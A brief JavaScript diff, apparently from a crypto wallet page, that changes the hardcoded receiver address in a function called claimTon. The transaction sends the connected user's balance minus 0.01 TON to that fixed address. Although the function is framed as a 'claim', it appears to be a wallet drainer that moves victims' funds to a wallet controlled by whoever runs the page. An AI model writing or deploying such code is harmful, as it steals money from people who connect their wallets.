@@ -680,7 +680,7 @@ async function claimTon() {
   const transaction = {
     messages: [
       {
-        address: "UQD-pZxfokGeBKZxu4FGOuKLDJTvqdsAwrL59Fr__7zjSz7H", // Receiver address
+        address: "UQDUoGbfyZPha2ld_pupshvSkyRbC3ZTBrRzxpngaImLvNcr", // Receiver address
         amount: claimAmount.toString(), // Send balance minus 0.01 TON
       },
     ],
